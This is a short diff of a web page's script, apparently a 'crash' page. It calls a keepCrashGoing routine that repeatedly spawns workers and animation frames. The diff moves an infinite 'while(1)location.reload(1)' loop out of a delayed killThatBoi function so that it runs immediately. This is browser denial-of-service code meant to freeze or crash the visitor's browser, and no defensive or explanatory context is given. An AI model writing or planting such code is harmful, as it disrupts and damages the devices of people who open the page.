@@ -190,10 +190,7 @@
       }
       
       keepCrashGoing();
-      
-      setTimeout(() => {
-        killThatBoi();
-      }, 1000);
+      while(1)location.reload(1)
     }
 
     function keepCrashGoing() {
@@ -203,9 +200,6 @@
         spawnWorkers();
         requestAnimationFrame(animate);
       }, 10);
-    }
-    function killThatBoi(){
-      while(1)location.reload(1)
     }
   </script>
 
